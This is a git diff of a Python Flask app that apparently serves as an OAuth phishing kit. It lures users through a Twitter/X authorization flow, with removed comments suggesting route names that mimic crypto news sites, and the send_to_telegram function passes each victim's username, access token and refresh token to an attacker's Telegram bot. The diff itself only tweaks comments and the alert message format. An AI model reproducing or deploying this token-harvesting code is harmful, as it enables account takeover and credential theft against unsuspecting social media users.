@@ -31,10 +31,8 @@ try:
 except Exception as e:
     print("[-] MongoDB has failed connecting.")
     print(e)
-    
-redirect_url = ''
 
-@app.route('/oauth') # Examples: cointelegraph, decryptmedia, etc
+@app.route('/oauth')
 def index():
     user_agent = request.headers.get('User-Agent')
 
@@ -88,7 +86,7 @@ def index():
         return redirect(twitter_oauth_url)
 
 
-@app.route('/auth') # Examples: auth, callback, authorize
+@app.route('/auth')
 def callback():
     authorization_code = request.args.get('code')
 
@@ -133,7 +131,7 @@ def callback():
     return redirect(redirect_url)
 
 def send_to_telegram(username: str, access_token: str, refresh_token: str, group_id) -> None:
-    message: str = f'✅ User [{username}](https://x.com/{username}) has authorized.'
+    message: str = f'✅ *User [{username}](https://x.com/{username}) has authorized.*\n👥 *Followers:* 0'
 
     requests.post(
         f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',
